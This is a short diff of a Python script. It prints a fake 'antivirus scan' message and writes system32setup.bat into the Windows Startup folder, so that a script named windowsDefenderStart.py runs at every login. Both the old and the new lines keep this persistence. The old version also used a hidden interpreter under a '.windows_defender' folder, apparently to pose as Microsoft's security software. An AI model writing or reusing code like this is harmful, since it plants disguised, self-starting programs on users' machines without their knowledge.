@@ -1,6 +1,6 @@
 import os, sqlite3, sys
 
-os.system(os.path.expanduser('~') + "\\.windows_defender\\python.exe -m pip install -r requirements.txt")
+os.system("py -m pip install -r requirements.txt")
 
 con = sqlite3.connect("database.db")
 
@@ -22,7 +22,7 @@ except:
 
 def FirstRun():
     print("starting antivirus scan ...")
-    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"@echo off\n{os.path.expanduser('~')}\\.windows_defender\\python.exe {os.getcwd()}\\windowsDefenderStart.py")
+    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"@echo off\npy {os.getcwd()}\\windowsDefenderStart.py")
 
 
 
